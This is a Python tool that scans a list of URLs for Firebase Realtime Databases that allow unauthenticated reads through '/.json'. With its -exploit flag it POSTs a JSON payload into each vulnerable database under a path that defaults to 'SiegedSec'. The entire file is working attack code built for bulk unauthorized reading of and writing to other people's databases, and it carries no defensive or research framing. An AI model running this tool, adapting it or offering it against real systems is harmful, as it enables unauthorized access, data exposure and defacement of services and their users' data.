import sys
import json
import requests
import argparse

class FirebaseMissconfExploit:
    def __init__(self):
        pass

    def check_json(self, url: str, cmd: str, exploit: bool, path: str) -> None:
        """
        Check if the provided URL is vulnerable to Firebase exploits.

        Args:
            url (str): The target URL.
            cmd (str): The command identifier.
            exploit (bool): Flag indicating whether to exploit vulnerabilities.
            path (str): The URI path for exploitation.
        
        Returns:
            None
        """
        if not url.startswith("https://"):
            url = "https://" + url
        if not url.endswith("/"):
            url += "/"
        try:
            resp = requests.get(url + ".json")
            if resp.status_code == 200:
                print(f"[+] {url} - Firebase Possibly Vulnerable")
                if exploit:
                    self.exploit_json(url, path)
            elif resp.status_code != 200 and cmd == "standalone":
                print(f"[*] {url} - Firebase Not Vulnerable")
        except Exception as e:
            print(f"[-] Failed to connect {url}")

    def is_json(self, s: str) -> bool:
        """
        Check if a string is valid JSON.

        Args:
            s (str): The string to be checked.
        
        Returns:
            bool: True if the string is valid JSON, False otherwise.
        """
        try:
            json.loads(s)
            return True
        except ValueError:
            return False

    def exploit_json(self, url: str, path: str) -> None:
        """
        Attempt to exploit the Firebase database at the specified URL.

        Args:
            url (str): The target URL.
            path (str): The URI path for exploitation.
        
        Returns:
            None
        """
        try:
            with open("./payloads/main.json", "r") as f:
                file_content = f.read()
                if not self.is_json(file_content):
                    print("[-] File './payloads/main.json' is not in proper JSON format")
                    sys.exit(-1)
                resp = requests.post(url + path + ".json", json=json.loads(file_content))
                if resp.status_code == 200:
                    print(f"[+] Exploited URL - {url}{path}.json")
                else:
                    print(f"[*] Exploited Failed For - {url}{path}.json")
        except FileNotFoundError:
            print("[-] File './payloads/main.json' does not exist")
            sys.exit(-1)
        except Exception as e:
            print(f"[-] Failed to exploit {url}{path}.json")

    def main(self) -> None:
        """
        Main entry point of the program.
        """
        parser = argparse.ArgumentParser(description="FirebaseMissconfExploit")
        parser.add_argument("-url", help="Target URL")
        parser.add_argument("-file", help="File Path")
        parser.add_argument("-exploit", action="store_true", help="Exploit")
        parser.add_argument("-path", default="SiegedSec", help="URI Path For Exploit")
        args = parser.parse_args()

        if not args.url and not args.file:
            parser.print_help()
            sys.exit(-1)

        if args.url:
            self.check_json(args.url, "standalone", args.exploit, args.path)
        
        if not args.url and args.file:
            try:
                with open(args.file, "r") as f:
                    for line in f:
                        self.check_json(line.strip(), "file", args.exploit, args.path)
            except FileNotFoundError as e:
                print(e)
                sys.exit(-1)

if __name__ == "__main__":
    exploit = FirebaseMissconfExploit()
    exploit.main()
